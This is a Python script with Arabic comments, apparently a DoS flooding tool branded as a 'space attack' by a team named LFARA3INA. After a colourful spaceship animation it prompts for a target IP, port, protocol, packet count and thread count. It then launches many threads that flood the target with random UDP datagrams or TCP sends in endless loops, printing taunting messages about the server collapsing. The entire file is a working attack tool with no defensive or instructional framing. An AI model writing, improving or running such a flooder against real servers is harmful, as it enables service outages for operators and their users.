import random
import socket
import threading
import platform
import time
import os
from colorama import init, Fore

# تفعيل الألوان
init(autoreset=True)

# متغيرات لتخصيص الأنميشن
spaceship = [
    "      /\\",
    "     /  \\",
    "    /____\\",
    "   |      |",
    "   | NASA |",
    "   |      |",
    "  /|______|\\",
    " /_/______\\_\\"
]

colors = [Fore.RED, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW]

# عرض الأنميشن الفضائي
def animate_spaceship():
    width = os.get_terminal_size().columns
    for _ in range(10):
        os.system('clear')  # أو 'cls' إذا كنت تستخدم Windows
        indent = random.randint(0, max(0, width - 20))
        color = random.choice(colors)
        for line in spaceship:
            print(" " * indent + color + line)
        time.sleep(0.25)

# بدأ الأنميشن قبل الهجوم
animate_spaceship()

# تفعيل الرسائل التفاعلية
print(Fore.YELLOW + "\n[+] نظام التشغيل: " + platform.system())
ip = str(input(Fore.CYAN + "Server IP         : "))
port = int(input("Port              : "))
choice = str(input("Use UDP (y/n)     : "))
times = int(input("Packets/Thread    : "))
threads = int(input("Threads           : "))

# رسائل عشوائية
messages = [
    "[+] المجرة تشتعل...",
    "[*] إشارات مشوشة تُرسل...",
    "[×] اختراق في الزمن...",
    "[!] هجوم موجات كونية...",
    "[#] السيرفر يصرخ..."
]

last_msg = None
def get_unique_message():
    global last_msg
    msg = random.choice(messages)
    while msg == last_msg:
        msg = random.choice(messages)
    last_msg = msg
    return msg

# أضافة الأنميشن المؤثر
def print_effect(effect_type):
    if effect_type == "attack":
        os.system('clear')  # أو 'cls' إذا كنت تستخدم Windows
        print(Fore.MAGENTA + "🚀️ هجــــوم فضائي مــــن فريق LFARA3INA")
        print(Fore.YELLOW + "💥️ الهجوم بدأ على السيرفر...")
        time.sleep(2)
    elif effect_type == "loading":
        os.system('clear')  # أو 'cls' إذا كنت تستخدم Windows
        print(Fore.CYAN + "⏳️ الإتصال بالسيرفر...")
        time.sleep(1)
    else:
        os.system('clear')  # أو 'cls' إذا كنت تستخدم Windows
        print(Fore.GREEN + "✅ الهجوم يتم بنجاح...")

# UDP Attack
def run_udp():
    data = random._urandom(1024)
    i = random.choice(messages)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print(Fore.MAGENTA + f"🌌 {get_unique_message()} - الهجوم باستخدام UDP")
        except Exception as e:
            print(Fore.RED + "[!] السيرفر انهار (UDP)!")
            break

# TCP Attack
def run_tcp():
    data = random._urandom(16)
    i = random.choice(messages)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for _ in range(times):
                s.send(data)
            print(Fore.CYAN + f"💥 {get_unique_message()} - الهجوم باستخدام TCP")
        except Exception as e:
            s.close()
            print(Fore.RED + "[!] السيرفر انهار (TCP)!")
            break

# انطلاق الهجوم
def start_attack():
    print_effect("loading")
    if choice.lower() == 'y':
        for _ in range(threads):
            th = threading.Thread(target=run_udp)
            th.start()
    else:
        for _ in range(threads):
            th = threading.Thread(target=run_tcp)
            th.start()

    print_effect("attack")

# بدء الهجوم
start_attack()